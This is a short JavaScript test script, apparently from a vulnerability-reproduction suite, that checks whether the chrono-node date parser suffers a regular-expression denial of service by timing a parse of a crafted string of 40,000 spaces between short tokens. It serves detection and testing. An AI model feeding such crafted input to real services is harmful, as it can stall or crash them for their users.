// test("ReDoS in chrono-node", () => {
  const measureTime = require("../utils").measureTime;
  const chrono = require("chrono-node");
  let attack_str = "BGR3" + " ".repeat(40000) + "186'";
  let t = measureTime(function () {
    chrono.parse(attack_str);
  });
  let time = t[0] + t[1] / 1000000000;
if (time > 1) {
	console.log("this_is_vulnerable")
} else {
	console.log("this_is_OK")
}
// });
